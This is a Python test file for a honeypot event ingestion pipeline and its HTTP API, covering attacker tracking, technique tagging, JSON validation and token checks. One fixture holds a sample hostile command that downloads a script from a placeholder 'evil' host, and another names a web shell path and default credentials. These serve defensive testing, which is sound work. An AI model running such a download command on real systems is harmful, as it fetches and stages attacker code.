"""Tests for the ingestion pipeline and HTTP API."""

from __future__ import annotations

import pytest
from aiohttp.test_utils import TestClient, TestServer

from canary.core.db import Database
from canary.ingest.api import create_app
from canary.ingest.pipeline import Pipeline


async def _noop(payload) -> None:
    return None


class TestPipeline:
    @pytest.mark.asyncio
    async def test_full_pipeline_roundtrip(self, tmp_path) -> None:
        db = Database(path=str(tmp_path / "p.db"))
        await db.connect()
        pipeline = Pipeline(db)

        result = await pipeline.ingest(
            {
                "honeypot": "blood-web",
                "protocol": "http",
                "src_ip": "193.40.0.1",
                "url": "/shell.php",
                "user_agent": "nuclei v3.0",
                "raw": "wget http://evil/x.sh -O /tmp/x.sh",
            }
        )
        assert result is not None
        assert result.id is not None
        assert result.technique is not None

        attacker = await db.get_attacker("193.40.0.1")
        assert attacker is not None
        assert attacker["event_count"] == 1
        await db.disconnect()


class TestApi:
    @pytest.mark.asyncio
    async def test_post_event(self, tmp_path) -> None:
        db = Database(path=str(tmp_path / "a.db"))
        await db.connect()
        pipeline = Pipeline(db)
        app = create_app(pipeline.ingest)
        client = TestClient(TestServer(app))
        await client.start_server()
        try:
            resp = await client.post(
                "/api/v1/events",
                json={
                    "honeypot": "backrooms",
                    "protocol": "smb",
                    "src_ip": "10.77.0.9",
                    "username": "vagrant",
                    "password": "vagrant",
                    "raw": "login attempt smb",
                },
            )
            assert resp.status == 201
            body = await resp.json()
            assert body["status"] == "accepted"
            assert body["technique"] == "T1110"
        finally:
            await client.close()
            await db.disconnect()

    @pytest.mark.asyncio
    async def test_invalid_json_rejected(self, tmp_path) -> None:
        app = create_app(_noop)
        client = TestClient(TestServer(app))
        await client.start_server()
        try:
            resp = await client.post("/api/v1/events", data="not-json")
            assert resp.status == 400
        finally:
            await client.close()

    @pytest.mark.asyncio
    async def test_api_token_required(self, tmp_path) -> None:
        app = create_app(_noop, api_token="s3cret")
        client = TestClient(TestServer(app))
        await client.start_server()
        try:
            resp = await client.post("/api/v1/events", json={"honeypot": "x"})
            assert resp.status == 401
            resp2 = await client.post(
                "/api/v1/events", json={"honeypot": "x"}, headers={"X-API-Token": "s3cret"}
            )
            assert resp2.status == 201
        finally:
            await client.close()
